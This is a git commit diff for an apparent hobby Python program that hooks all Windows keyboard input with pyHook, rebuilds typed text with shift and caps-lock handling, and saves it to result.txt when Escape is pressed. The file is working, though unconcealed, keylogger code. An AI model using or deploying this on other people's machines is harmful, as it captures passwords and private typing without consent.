9b94a2b184cdc29bce1e7520184b86f052b95204
MrB4N4N4 <2016rudgns@naver.com>
2021-08-11 18:03:46 +0900

    Implemetation of combination key function

--- src/main.py
+++ src/main.py
@@ -1,49 +1,100 @@
+# Available at python version 3.7 only. Because of pyHook library and it is unofficial.
 import pythoncom, pyHook # for hooking.
-import win32api, win32con # for indicate caps state.
+import win32api, win32con # for indicate caps lock state.
 
-SIG_SHIFT = 0
-SIG_NEXTLINE = 1
-SIG_ERASE = 2
-
+SIG_SHIFT = 11
+SIG_NEXT_LINE = 12
+SIG_EXIT = 13
+SIG_ERASE = 14
 FILE_NAME = "result.txt"
 
-
-"""
-enter : Return
-backsapace : Back
-tab : Tab
-caps : Capital
-space : Space
-esc : Escape
-"""
-
+glob_string = ""
+glob_shift = False
+# indicates state of caps lock. 0:lower / 1:upper
+glob_caps_stat = win32api.GetKeyState(win32con.VK_CAPITAL)
 comb_keys = {
     "Lshift" : SIG_SHIFT,
     "Rshift" : SIG_SHIFT,
-    "Tab" : SIG_NEXTLINE,
-    "Return" : SIG_NEXTLINE,
-    "Space" : SIG_NEXTLINE,
-    "Escape" : SIG_NEXTLINE,
+    "Tab" : SIG_NEXT_LINE,
+    "Return" : SIG_NEXT_LINE,
+    "Space" : SIG_NEXT_LINE,
+    "Escape" : SIG_EXIT,
     "Back" : SIG_ERASE,
+    "Capital" : None,
+}
+
+shift_num = {
+    "`" : "~",
+    "1" : "!",
+    "2" : "@",
+    "3" : "#",
+    "4" : "$",
+    "5" : "%",
+    "6" : "^",
+    "7" : "&",
+    "8" : "*",
+    "9" : "(",
+    "0" : ")",
+    "-" : "_",
+    "=" : "+",
 }
 
 
-def OnKeyboardEvent(event):
-    # indicates state of caps lock. 0:lower / 1:upper
-    caps_stat = win32api.GetKeyState(win32con.VK_CAPITAL)
-    try:
-        key = str(event.Key)
-        print("Key: ", key)
-    except:
-        pass
+def ProcessComb(signal):
+    global glob_shift
+    global glob_string
 
-# return True to pass th event to other handlers.
+    if signal == SIG_SHIFT:
+        glob_shift = True
+    elif signal == SIG_NEXT_LINE:
+        glob_string += "\n"
+    elif signal == SIG_ERASE:
+        glob_string = glob_string[:-1]
+    elif signal == SIG_EXIT:
+        with open("result.txt", "w") as f:
+            f.write(glob_string)
+        exit()
+    return True
+
+
+def OnKeyboardDown(event):
+    global glob_shift
+    global glob_string
+    key = str(event.Key)
+    print(key, "Down")
+    if key in comb_keys.keys():
+        signal = comb_keys[key]
+        ProcessComb(signal)
+        return True
+
+    if key.isalpha():
+        if not(glob_shift ^ glob_caps_stat): # if not(0:lower / 1:upper)
+            key = key.lower()
+    elif glob_shift:
+        key = shift_num[key]
+    glob_string += key
+# return True to pass event to other handlers.
+    return True
+
+# Combination key up event.
+def OnKeyboardUp(event):
+    global glob_shift
+    global glob_string
+
+    key = str(event.Key)
+    if key not in comb_keys.keys():
+        return True
+    if comb_keys[key] == SIG_SHIFT:
+        glob_shift = False
+    print(key, "Up")
     return True
 
 # create a hook manager.
 hm = pyHook.HookManager()
-# watch for all events.
-hm.KeyDown = OnKeyboardEvent
+# watch for key down event.
+hm.KeyDown = OnKeyboardDown
+# watch for key up event.
+hm.KeyUp = OnKeyboardUp
 # set the hook.
 hm.HookKeyboard()
 # wait forever.
